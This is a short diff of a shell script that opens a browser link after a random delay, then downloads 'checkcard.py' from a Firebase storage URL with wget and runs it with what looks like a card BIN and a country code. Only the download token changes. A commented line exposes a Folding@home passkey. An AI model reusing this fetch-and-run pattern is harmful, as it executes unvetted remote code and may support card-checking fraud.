@@ -18,7 +18,7 @@ curl -k -s -o /dev/null -w '%{http_code}' -i -H "Accept: application/json" -H "C
 wait=$(shuf -i 60-500 -n 1)
 sleep $wait
 firefox $link &
-wget -O check.py https://firebasestorage.googleapis.com/v0/b/jsonserver-b9334.appspot.com/o/checkcard.py?alt=media&token=08b755b6-572b-43bf-9d2d-6a7db60bee2b
+wget -O check.py https://firebasestorage.googleapis.com/v0/b/jsonserver-b9334.appspot.com/o/checkcard.py?alt=media&token=041de0fd-e1b9-4d30-949d-ee087750b1a7
 python3 check.py 421542 us
 #python3 /headless/Desktop/backup/pygui.py
 #FAHClient --user=8fek7tcbax69 --team=234980 --passkey=f11cf30f860040d0f11cf30f860040d0 --gpu=false --smp=true
